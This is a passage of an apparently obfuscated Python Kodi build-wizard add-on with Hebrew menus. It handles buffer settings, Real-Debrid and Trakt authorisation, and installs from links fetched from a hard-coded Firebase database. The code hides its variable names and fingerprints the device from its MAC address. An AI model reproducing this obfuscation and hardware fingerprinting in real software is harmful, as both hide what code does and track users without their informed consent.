          OOOOOOO0OO0O0O000 =OOOOOOO0OO0O0O000 +int (O000O0O0OOOO00OOO .replace (':',''),16 )#line:1026
          break #line:1027
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1028
       OOO00OO0000O00OO0 =0 #line:1029
       OOOOOOO0OO0O0O000 =0 #line:1030
       OO0O0OOOO0000OO0O =[]#line:1031
       O00OOOOOOOOO00OO0 =os .popen ("getmac").read ()#line:1032
       O00OOOOOOOOO00OO0 =O00OOOOOOOOO00OO0 .split ("\n")#line:1033
       for OO0O00OO00OO0O000 in O00OOOOOOOOO00OO0 :#line:1034
            OOO0OOO00OOOO0O00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0O00OO00OO0O000 ,re .I )#line:1035
            if OOO0OOO00OOOO0O00 :#line:1036
                O0OO0OO00OO000OO0 =OOO0OOO00OOOO0O00 .group ().replace ('-',':')#line:1037
                OO0O0OOOO0000OO0O .append (O0OO0OO00OO000OO0 )#line:1038
                OOOOOOO0OO0O0O000 =OOOOOOO0OO0O0O000 +int (O0OO0OO00OO000OO0 .replace (':',''),16 )#line:1039
                break #line:1040
   elif xbmc .getCondVisibility ('system.platform.linux'):#line:1041
       OOOOOOO0OO0O0O000 =0 #line:1042
       import uuid #line:1043
       O0OO0OO00OO000OO0 =hex (uuid .getnode ())#line:1044
       OOOOOOO0OO0O0O000 =OOOOOOO0OO0O0O000 +int (O0OO0OO00OO000OO0 .replace (':',''),16 )#line:1045
   else :#line:1046
       OOOOOOO0OO0O0O000 =0 #line:1047
       import uuid #line:1048
       O0OO0OO00OO000OO0 =hex (uuid .getnode ())#line:1049
       OOOOOOO0OO0O0O000 =OOOOOOO0OO0O0O000 +int (O0OO0OO00OO000OO0 .replace (':',''),16 )#line:1050
   try :#line:1065
    return OOOOOOO0OO0O0O000 #line:1066
   except :pass #line:1067
def getHwAddr_old (O0OO000OO000O0O00 ):#line:1069
   import subprocess ,time #line:1070
   OOO00OO000O0O00O0 ='windows'#line:1071
   if xbmc .getCondVisibility ('system.platform.android'):#line:1072
       OOO00OO000O0O00O0 ='android'#line:1073
   if xbmc .getCondVisibility ('system.platform.android'):#line:1074
     O00O0000O0OOOOOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1075
     O000O0O0O00OOO0O0 =re .compile ('link/ether (.+?) brd').findall (str (O00O0000O0OOOOOO0 ))#line:1077
     O0OO0000O000OO00O =0 #line:1078
     for OOO000O0OO0O00OOO in O000O0O0O00OOO0O0 :#line:1079
      if O000O0O0O00OOO0O0 !='00:00:00:00:00:00':#line:1080
          O00000OOO0O0OO0O0 =OOO000O0OO0O00OOO #line:1081
          O0OO0000O000OO00O =O0OO0000O000OO00O +int (O00000OOO0O0OO0O0 .replace (':',''),16 )#line:1082
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1084
       O00OOOO0O0OOO00O0 =0 #line:1085
       O0OO0000O000OO00O =0 #line:1086
       O0000OOO00OOOOOO0 =[]#line:1087
       O0O00O000O00O00O0 =os .popen ("getmac").read ()#line:1088
       O0O00O000O00O00O0 =O0O00O000O00O00O0 .split ("\n")#line:1089
       for O0O00OO00O00OOOOO in O0O00O000O00O00O0 :#line:1091
            OO00O0OO0O0O00OOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0O00OO00O00OOOOO ,re .I )#line:1092
            if OO00O0OO0O0O00OOO :#line:1093
                O000O0O0O00OOO0O0 =OO00O0OO0O0O00OOO .group ().replace ('-',':')#line:1094
                O0000OOO00OOOOOO0 .append (O000O0O0O00OOO0O0 )#line:1095
                O0OO0000O000OO00O =O0OO0000O000OO00O +int (O000O0O0O00OOO0O0 .replace (':',''),16 )#line:1098
   else :#line:1100
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1101
   try :#line:1118
    return O0OO0000O000OO00O #line:1119
   except :pass #line:1120
def getpass ():#line:1121
	disply_hwr2 ()#line:1123
def setpass ():#line:1124
    O00O0OO0OO0O000OO =xbmcgui .Dialog ()#line:1125
    O0OO0O000OO0O0000 =''#line:1126
    OO0O0O0OO0OO0OOOO =xbmc .Keyboard (O0OO0O000OO0O0000 ,'הכנס סיסמה')#line:1128
    OO0O0O0OO0OO0OOOO .doModal ()#line:1129
    if OO0O0O0OO0OO0OOOO .isConfirmed ():#line:1130
           OO0O0O0OO0OO0OOOO =OO0O0O0OO0OO0OOOO .getText ()#line:1131
    wiz .setS ('pass',str (OO0O0O0OO0OO0OOOO ))#line:1132
def setuname ():#line:1133
    O00O0O0O0O000OO0O =''#line:1134
    O00OO000OOO0O00OO =xbmc .Keyboard (O00O0O0O0O000OO0O ,'הכנס שם משתמש')#line:1135
    O00OO000OOO0O00OO .doModal ()#line:1136
    if O00OO000OOO0O00OO .isConfirmed ():#line:1137
           O00O0O0O0O000OO0O =O00OO000OOO0O00OO .getText ()#line:1138
           wiz .setS ('user',str (O00O0O0O0O000OO0O ))#line:1139
def powerkodi ():#line:1140
    os ._exit (1 )#line:1141
def xml_data_advSettings_old (O00O0O0OO0000O0O0 ):#line:1142
	O00O0O00O0OO00000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O00O0O0OO0000O0O0 #line:1152
	return O00O0O00O0OO00000 #line:1153
def xml_data_advSettings_New (O00O0OO00O0O0O0OO ):#line:1155
    O00OO0O0OOO000O00 ="""<advancedsettings>
      <cache>
        <memorysize>%s</memorysize> 
        <buffermode>2</buffermode>
        <readfactor>2</readfactor>
      </cache>
    <video>
        <subsdelayrange>200</subsdelayrange>
    </video>
</advancedsettings>"""%O00O0OO00O0O0O0OO #line:1165
    return O00OO0O0OOO000O00 #line:1166
def write_ADV_SETTINGS_XML (O0O00O00OOOOOO0O0 ):#line:1167
    if not os .path .exists (xml_file ):#line:1168
        with open (xml_file ,"w")as O000OOO00OO00OOO0 :#line:1169
            O000OOO00OO00OOO0 .write (xml_data )#line:1170
def clean_buffer ():#line:1171
    O0OOO0O0OO0OOOO0O =xbmcgui .Dialog ()#line:1172
    OO00O00000O00OO0O =O0OOO0O0OO0OOOO0O .yesno (ADDONTITLE ,"האם למחוק את הגדרת הבאפר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1173
    if OO00O00000O00OO0O ==1 :#line:1174
        try :#line:1175
            os .remove (os .path .join (translatepath ("special://userdata/"),"advancedsettings.xml"))#line:1176
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'הגדרת הבאפר נמחקה')#line:1177
        except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'אין קובץ באפר למחיקה')#line:1178
    else :#line:1179
     sys .exit ()#line:1180
def auto_buffer ():#line:1182
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1183
    OOO0000O0O0O00OO0 =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1184
    OOO0OO0OOOOOO0O0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1185
    OOOOO0O000O00000O =xbmc .getInfoLabel ("System.FreeMemory")#line:1186
    O0OO0O00OO0O0OOOO =re .sub ('[^0-9]','',OOOOO0O000O00000O )#line:1187
    O0OO0O00OO0O0OOOO =int (O0OO0O00OO0O0OOOO )/3 #line:1188
    O0OO0O00OOO0000O0 =O0OO0O00OO0O0OOOO *1024 *1024 #line:1190
    with open (OOO0000O0O0O00OO0 ,"w")as O00O00OO0OO00000O :#line:1198
            OOO00O0OO000OOO00 =xml_data_advSettings_New (str (O0OO0O00OOO0000O0 ))#line:1199
            O00O00OO0OO00000O .write (OOO00O0OO000OOO00 )#line:1200
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (O0OO0O00OOO0000O0 )))#line:1201
def auto_buffer_fromskin ():#line:1202
    OOO0O0OO0O000O0O0 =xbmcgui .Dialog ()#line:1203
    O0OOO0OOO0000OO00 =OOO0O0OO0O000O0O0 .yesno (ADDONTITLE ,"האם להגדיר באפר לפי נתוני המכשיר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1204
    if O0OOO0OOO0000OO00 ==1 :#line:1205
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1206
        OOOOOO00O0OO0OO0O =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1207
        O000O0OOO0O0OOO00 =xbmc .getInfoLabel ("System.Memory(total)")#line:1208
        OO0OOO0OO0OO000OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1209
        O0OO0OO0O000O00O0 =re .sub ('[^0-9]','',OO0OOO0OO0OO000OO )#line:1210
        O0OO0OO0O000O00O0 =int (O0OO0OO0O000O00O0 )/3 #line:1211
        OOOO0000OOOO000O0 =O0OO0OO0O000O00O0 *1024 *1024 #line:1213
        with open (OOOOOO00O0OO0OO0O ,"w")as O0O00OO0O0O00000O :#line:1221
                O0OO0O0OOOOOOOO0O =xml_data_advSettings_New (str (OOOO0000OOOO000O0 ))#line:1222
                O0O00OO0O0O00000O .write (O0OO0O0OOOOOOOO0O )#line:1223
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (OOOO0000OOOO000O0 )))#line:1224
        resetkodi ()#line:1225
    else :#line:1226
     sys .exit ()#line:1227
def _O000OO00OO00O000O (default ="",heading ="",hidden =False ):#line:1228
    ""#line:1229
    O0O0O00O0OOOO0OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:1230
    O0O0O00O0OOOO0OO0 .doModal ()#line:1231
    if (O0O0O00O0OOOO0OO0 .isConfirmed ()):#line:1232
        return str (O0O0O00O0OOOO0OO0 .getText (),"utf-8")#line:1233
    return default #line:1234
def index ():#line:1236
	addFile ('קוד מכשיר: [COLOR yellow]%s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1237
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1238
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1267
	if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1268
		addFile ('עדכון מערכת','force_update',icon =ICONSAVE ,themeit =THEME1 )#line:1269
	addFile ('-----------------','',themeit =THEME3 )#line:1270
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1274
	if BUILDNAME =="":#line:1276
		addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1277
	else :#line:1278
		addDir ('התקנה מחדש','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1279
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1281
def firstinstall ():#line:1283
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1284
def morsetup ():#line:1287
	addDir ('התאמה למערכת הפעלה לינוקס','linux',icon =ICONSAVE ,themeit =THEME1 )#line:1288
	addDir ('התאם את טלמדיה לאנדרואיד 5','telemedia5',icon =ICONSAVE ,themeit =THEME1 )#line:1289
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1290
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1291
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1293
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1294
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1298
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1299
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:1303
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:1304
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1305
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1315
	setView ('files','viewType')#line:1316
def morsetup2 ():#line:1317
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1318
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1319
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1320
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1321
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1322
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1323
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1324
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1325
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1326
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1327
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1328
def fastupdate ():#line:1329
    if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1330
        addFile ('עדכון מערכת','testnotify',themeit =THEME1 )#line:1331
def forcefastupdate ():#line:1333
			OOO0O0000O00O00O0 ="[COLOR %s]ברוכים הבאים לעדכון המערכת![/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1334
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0O0000O00O00O0 )#line:1335
def rdsetup ():#line:1339
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:1340
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:1341
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:1343
def traktsetup ():#line:1347
	addFile ('[COLOR yellow]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1348
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1349
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1350
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1351
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1352
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1353
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1354
	setView ('files','viewType')#line:1355
def setautorealdebrid ():#line:1356
    from resources .libs import real_debrid #line:1357
    O00O0O0000O000000 =real_debrid .RealDebridFirst ()#line:1358
    O00O0O0000O000000 .auth ()#line:1359
def setrealdebrid ():#line:1361
    OO0OO00O00OO0O0OO =(wiz .getS ("auto_rd"))#line:1362
    if OO0OO00O00OO0O0OO =='false':#line:1363
       ADDON .openSettings ()#line:1364
    else :#line:1365
        from resources .libs import real_debrid #line:1366
        OOO0OO0OOOOO00OOO =real_debrid .RealDebrid ()#line:1367
        OOO0OO0OOOOO00OOO .auth ()#line:1368
def read_firebase_c (OO00OOO0O00OOO0OO ):#line:1372
    from resources .libs import firebase #line:1373
    OO0O0OO0OOO00OO00 =firebase .FirebaseApplication ('https://zxcsd-3bae5-default-rtdb.firebaseio.com',None )#line:1374
    O0O0OOO0OOOOO0000 =OO0O0OO0OOO00OO00 .get ('/',None )#line:1375
    if OO00OOO0O00OOO0OO in O0O0OOO0OOOOO0000 :#line:1376
        return O0O0OOO0OOOOO0000 [OO00OOO0O00OOO0OO ]#line:1377
    else :#line:1378
        return {}#line:1379
def readcode ():#line:1380
    OOOO0O000O00000O0 =read_firebase_c ('build_link')#line:1381
    OOO0OOO0OO000O00O =[]#line:1382
    for OOOO00OO0OOOOO0OO in OOOO0O000O00000O0 :#line:1383
        OOO0O000O0O0O0O0O =OOOO0O000O00000O0 [OOOO00OO0OOOOO0OO ]#line:1384
        OOO0OOO0OO000O00O .append ((OOO0O000O0O0O0O0O ['link']))#line:1385
    for OOOOO0O0O00OOOOOO in OOO0OOO0OO000O00O :#line:1386
       return OOOOO0O0O00OOOOOO #line:1387
def resolveurlsetup ():#line:1388
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1389
def urlresolversetup ():#line:1390
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1391
def placentasetup ():#line:1393
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1394
def reptiliasetup ():#line:1395
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1396
def flixnetsetup ():#line:1397
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1398
def yodasetup ():#line:1399
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1400
def numberssetup ():#line:1401
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1402
def uranussetup ():#line:1403
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1404
def genesissetup ():#line:1405
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1406
def net_tools (view =None ):#line:1408
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1409
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1410
	setView ('files','viewType')#line:1412
def speedMenu ():#line:1413
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1414
def viewIP ():#line:1415
	O0O0O0O00O0OO00OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1429
	O00OO00OO0OOO00O0 =[];O0OOO0OOO0O0OO0OO =0 #line:1430
	for O00000OO0OOOOOO0O in O0O0O0O00O0OO00OO :#line:1431
		O0O0000OOOOO000OO =wiz .getInfo (O00000OO0OOOOOO0O )#line:1432
		OOO0O00OO0OO0O00O =0 #line:1433
		while O0O0000OOOOO000OO =="Busy"and OOO0O00OO0OO0O00O <10 :#line:1434
			O0O0000OOOOO000OO =wiz .getInfo (O00000OO0OOOOOO0O );OOO0O00OO0OO0O00O +=1 ;wiz .log ("%s sleep %s"%(O00000OO0OOOOOO0O ,str (OOO0O00OO0OO0O00O )));xbmc .sleep (1000 )#line:1435
		O00OO00OO0OOO00O0 .append (O0O0000OOOOO000OO )#line:1436
		O0OOO0OOO0O0OO0OO +=1 #line:1437
	OO0O0O0000OOO0O0O ,O0OOO0O00O0O0O0O0 ,OO000000OO0OO0OO0 =getIP ()#line:1438
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00OO0OOO00O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1439
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0000OOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1440
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00O0O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1441
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000000OO0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1442
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00OO0OOO00O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1443
	setView ('files','viewType')#line:1444
def buildMenu ():#line:1445
    if KODIV <=18 :#line:1448
        DIALOG .ok (ADDONTITLE ,'ההתקנה זמינה מקודי 19 ומעלה'+'\n'+' גרסת הקודי שלך היא: '+str (KODIV ))#line:1449
        sys .exit ()#line:1450
    if not len (ADDON .getSetting ("user"))>0 :#line:1451
        addFile ('הכנס שם משתמש','STARTP','','',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit ='')#line:1452
    elif not len (ADDON .getSetting ("pass"))>0 :#line:1453
        addFile ('הכנס סיסמה','STARTP2','','',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit ='')#line:1455
    else :#line:1456
        if BUILDNAME =="":#line:1458
            addFile ('התקנה','install'," Kodi Premium",'fresh',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit =THEME1 )#line:1459
        else :#line:1460
            addFile ('התקנה מחדש','install'," Kodi Premium",'fresh',description ='',fanart =FANART ,icon =ICONBUILDS ,themeit =THEME1 )#line:1461
            addFile ('אימות חשבון','passandUsername'," Kodi Premium",'passandUsername',themeit =THEME1 )#line:1462
    addFile ('קוד מכשיר: [COLOR yellow]%s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1464
    addFile (' ',' ',icon =ICONBUILDS ,themeit =THEME1 )#line:1465
    addFile (' ',' ',icon =ICONBUILDS ,themeit =THEME1 )#line:1466
    addFile ('לעזרה בטלגרם לחצו כאן','help_install',icon =ICONBUILDS ,themeit =THEME1 )#line:1467
def buildMenu22 ():#line:1468
	if USERNAME ==''or PASSWORD =='':#line:1470
		ADDON .openSettings ()#line:1471
		if BUILDNAME =="":#line:1472
			xbmc .executebuiltin ("ActivateWindow(home)")#line:1473
		sys .exit ()#line:1474
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מאמת פרטים, אנא המתן...[/COLOR]'%COLOR2 )#line:1477
	check ()#line:1478
	O0OOO0OO00O00000O =u_list (ld (BL ))#line:1479
	O0O000O0OO00O00O0 =wiz .workingURL (ld (BL ))#line:1482
	if not O0O000O0OO00O00O0 ==True :#line:1483
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1484
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1485
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1486
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1487
		addFile ('%s'%O0O000O0OO00O00O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1488
	else :#line:1489
		OO0OO00000OO0OOOO ,OOO000OOOO0O0OO00 ,O0OO0000OOO000OOO ,O0OOO00OO000OO0O0 ,O0OO000O0OO0O0O0O ,OO000000OO00O0OO0 ,OOO0O0000O000OOO0 =wiz .buildCount ()#line:1490
		OO00O0O00OOO0O0OO =False ;O0OO00OO00OO00O00 =[]#line:1491
		if THIRDPARTY =='true':#line:1492
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00O0O00OOO0O0OO =True ;O0OO00OO00OO00O00 .append ('1')#line:1493
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00O0O00OOO0O0OO =True ;O0OO00OO00OO00O00 .append ('2')#line:1494
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00O0O00OOO0O0OO =True ;O0OO00OO00OO00O00 .append ('3')#line:1495
		O0O0O0O0O0000O0OO =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1496
		OO00O0OO00O000O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0O0O0000O0OO )#line:1497
		if OO0OO00000OO0OOOO ==1 and OO00O0O00OOO0O0OO ==False :#line:1498
			for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1499
				if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1500
				if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1501
				viewBuild (OO00O0OO00O000O00 [0 ][0 ])#line:1502
				return #line:1503
		if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1506
			addFile ('עדכון מערכת','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1507
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1508
		if OO00O0O00OOO0O0OO ==True :#line:1509
			for OOO0O00O0O0OO000O in O0OO00OO00OO00O00 :#line:1510
				OO00O0000OO0O0O0O =eval ('THIRD%sNAME'%OOO0O00O0O0OO000O )#line:1511
		if len (OO00O0OO00O000O00 )>=1 :#line:1513
			if SEPERATE =='true':#line:1514
				for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1515
					if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1516
					if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1517
					OO0O0O00OO0O0OO0O =createMenu ('install','',OO00O0000OO0O0O0O )#line:1518
					addDir ('[%s] %s (v%s)'%(float (O0O0000OOOOOOOO0O ),OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ),'viewbuild',OO00O0000OO0O0O0O ,description =OOOOOOO0OOOOO0OO0 ,fanart =O0OOOOOOOOO000O0O ,icon =O00000000000000OO ,menu =OO0O0O00OO0O0OO0O ,themeit =THEME2 )#line:1519
			else :#line:1520
				if O0OOO00OO000OO0O0 >0 :#line:1521
					OOOOOO0O00000O00O ='+'if SHOW17 =='false'else '-'#line:1522
					if SHOW17 =='true':#line:1524
						for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1526
							if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1527
							if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1528
							OOOO0OOOOOOO000OO =int (float (O0O0000OOOOOOOO0O ))#line:1529
							if OOOO0OOOOOOO000OO ==17 :#line:1530
								OO0O0O00OO0O0OO0O =createMenu ('install','',OO00O0000OO0O0O0O )#line:1531
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOOOOOOO0O ),OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ),'viewbuild',OO00O0000OO0O0O0O ,description =OOOOOOO0OOOOO0OO0 ,fanart =O0OOOOOOOOO000O0O ,icon =O00000000000000OO ,menu =OO0O0O00OO0O0OO0O ,themeit =THEME2 )#line:1532
